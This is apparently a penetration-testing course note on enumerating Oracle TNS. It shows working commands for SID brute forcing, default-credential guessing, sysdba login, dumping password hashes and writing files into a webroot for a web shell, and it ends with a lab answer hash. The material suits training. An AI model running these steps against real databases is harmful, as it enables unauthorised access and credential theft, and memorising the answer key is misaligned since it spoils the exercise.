# Oracle TNS

**Oracle Transparent Network Substrate (TNS)** is the communication protocol Oracle databases use for client connections. The **TNS listener** waits for incoming connections on **TCP port 1521** by default. Oracle TNS supports TCP/IP, UDP, IPX/SPX, and AppleTalk. Remote management of TNS was possible in Oracle 8i/9i but not in 10g/11g.

## Configuration Files

TNS is configured by two files in `$ORACLE_HOME/network/admin`:

- **`tnsnames.ora`** — client-side; maps service names to network locations.
- **`listener.ora`** — server-side listener configuration.

A simple `tnsnames.ora` entry looks like:

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

| Setting | Description |
| --- | --- |
| `DESCRIPTION` | Names the database and its connection type. |
| `ADDRESS` | Network address (hostname + port). |
| `CONNECT_DATA` | Connection attributes — service name or **SID**, protocol, instance ID. |
| `SID` / `SERVICE_NAME` | The identifier the client uses to connect to a specific instance. |
| `USER` / `PASSWORD` | Credentials for authentication. |

> **The PL/SQL Exclusion List (`PlsqlExclusionList`)** is a user-created text file in `$ORACLE_HOME/sqldeveloper` that blacklists PL/SQL packages/types from execution via the Oracle Application Server.

## Setup: Installing the Tooling

Oracle enumeration needs the Oracle Instant Client, plus **ODAT** (Oracle Database Attacking Tool) and its dependencies:

```shell
# Oracle Instant Client
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH

# ODAT and dependencies
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init && git submodule update
sudo apt-get install python3-scapy build-essential libgmp-dev -y
sudo pip3 install colorlog termcolor passlib python-libnmap pycryptodome cx_Oracle
```

> **PEP 668 gotcha (modern Parrot/Kali):** `pip3 install` may fail with `error: externally-managed-environment`. Either append **`--break-system-packages`** to each pip command, or create a virtualenv. If ODAT later errors with `ModuleNotFoundError: No module named 'Crypto'`, the **`pycryptodome`** install silently failed — reinstall it. The `SyntaxWarning: invalid escape sequence` messages from ODAT are harmless.

## Footprinting the Service

### SID Brute Forcing with Nmap

The **System Identifier (SID)** is required to connect to an instance. Brute-force it:

```shell
$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute:
|_  XE
```

> `XE` is the default SID for **Oracle Express Edition** — a very common finding.

### ODAT – Full Enumeration

The `all` module runs every check ODAT has, including credential guessing against common Oracle accounts:

```shell
$ ./odat.py all -s 10.129.1.138

[+] According to a test, the TNS listener 10.129.1.138:1521 is well configured. Continue...
[!] Notice: 'oracle_ocm' account is locked, skipping...
[+] Valid credentials found: scott/tiger. Continue...
```

> `scott/tiger` is a legendary default Oracle credential pair — always worth trying.

### Connecting with SQL*Plus

Use the discovered credentials and SID. Add `as sysdba` for administrative access:

```shell
$ sqlplus scott/tiger@10.129.1.138/XE as sysdba

SQL> select * from user_role_privs;        -- check granted roles
SQL> select name, password from sys.user$; -- dump password hashes
```

Dumping `sys.user$` reveals user password hashes:

```sql
NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
SYSTEM                         B5073FE1DE351687
OUTLN                          4A3BA55E08595C81
...
```

### Oracle RDBMS – File Upload

With `sysdba` access, the `utlfile` module can write files to the server's filesystem — e.g. dropping a web shell into a webroot:

```shell
$ echo "Oracle File Upload Test" > testing.txt
$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba \
    --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Verify
$ curl -X GET http://10.129.204.235/testing.txt
Oracle File Upload Test
```

---

## Module Answer

> **Enumerate the Oracle database and submit the password hash of user `DBSNMP`.**
> **`E066D214D5421CCC`**
>
> Recovered by connecting with `scott/tiger` (found via ODAT) and querying `sys.user$` for the `DBSNMP` row.
